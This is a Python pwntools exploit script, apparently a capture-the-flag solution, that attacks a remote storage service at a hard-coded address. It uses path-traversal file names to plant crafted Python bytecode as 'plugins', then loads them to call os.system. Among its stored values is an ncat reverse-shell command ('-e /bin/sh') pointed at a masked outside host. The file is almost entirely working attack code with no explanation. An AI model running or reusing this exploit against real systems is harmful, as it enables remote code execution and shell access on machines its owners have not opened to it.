# type: ignore
from os import path
from types import CodeType
from pwn import * 
from hashlib import md5


HOST = '23.88.100.81'
PORT = '25711'


sleep_t = 0.01

def open_socket():
    return remote(HOST, PORT)

def store(entry: bytes, data: bytes) -> bytes:
    p = open_socket()
    p.send('S')
    p.send(entry.ljust(12, b'\xff'))

    data = data.hex()
    assert(len(data) < 0x100)
    p.send(chr(len(data)))
    p.send(data)

    val = p.recvline()
    p.close()
    
    sleep(sleep_t)
    return val

def dump() -> None:
    p = open_socket()
    p.send('D')
    p.close()
    sleep(sleep_t*10)

def plugin(filename: bytes, is_intr = False) -> None:
    p = open_socket()
    p.send('P')
    p.send(filename.ljust(12, b' '))
    if not is_intr:
        p.close()
        sleep(sleep_t*10)
    else:
        p.interactive()

## 1: WITH_EXCEPT_START

## LOAD_CONST 0x31
## WITH_EXCEPT_START

beforehex1 = "dc"*4 + "d0d0d110"
beforehex2 = "dc"*4 + "d0d0d210"
beforehex3 = "dc"*4 + "d0d0d310"
beforehex4 = "dc"*4 + "d0d0d410"
beforehex5 = "dc"*4 + "d0d0d510"
beforehex6 = "dc"*4 + "d0d0d610"
beforehex7 = "dc"*4 + "d0d0d710"
beforehex8 = "dc"*4 + "d0d0d810"
beforehex9 = "dc"*4 + "d0d0d910"

for i in range(0, ord('0')-9):
    print(store(str(i).encode('utf-8'), str(i).encode('utf-8')))

print(store(b'../plugins/a', bytes.fromhex(beforehex1))) ## -8
print(store(b'../plugins/b', bytes.fromhex(beforehex2))) ## -7
print(store(b'../plugins/c', bytes.fromhex(beforehex3))) ## -6
print(store(b'../plugins/d', bytes.fromhex(beforehex4))) ## -5
print(store(b'../plugins/e', bytes.fromhex(beforehex5))) ## -4
print(store(b'../plugins/f', bytes.fromhex(beforehex6))) ## -3
print(store(b'../plugins/g', bytes.fromhex(beforehex7))) ## -2
print(store(b'../plugins/h', bytes.fromhex(beforehex8))) ## -1
print(store(b'../plugins/i', bytes.fromhex(beforehex9))) ## -1

exploit_str = b't\x00d^\x83\x01Z\x04t\x01d_\x83\x01Z\x05d`Z\x06daZ\x07dbZ\x08t\x02e\x04e\x05e\x05e\x05\x14\x00\x85\x02\x19\x00\x83\x01\xa0\x03e\x06e\x07\x17\x00e\x08\x17\x00\xa1\x01\x01\x00d\x00S\x00;str;int;__import__;system;a;p;q;r;s'
for ch in [b'./plugins/nn']:
    print(store(ch, ch))

exploit_str = exploit_str.ljust(120-1, b";")
for i in range(0, 12*10, 12):
    print(store(exploit_str[i:i+12], exploit_str[i:i+12]))

for i in range(ord('9'), ord('a')-6):
    print(store(str(i).encode('utf-8'), str(i).encode('utf-8')))

for i in [b'0'*12, b'osflag000000', b'000000000002', b'ncat ***.***', b'*.**.** ****', b'* -e /bin/sh']:
    print(store(i, i))

dump()

plugin(b'../plugins/a')
plugin(b'../plugins/b')
plugin(b'../plugins/c')
plugin(b'../plugins/d')
plugin(b'../plugins/e')
plugin(b'../plugins/f')
plugin(b'../plugins/g')
plugin(b'../plugins/h')
plugin(b'../plugins/i')


plugin(b'nn', True)

# p.interactive()
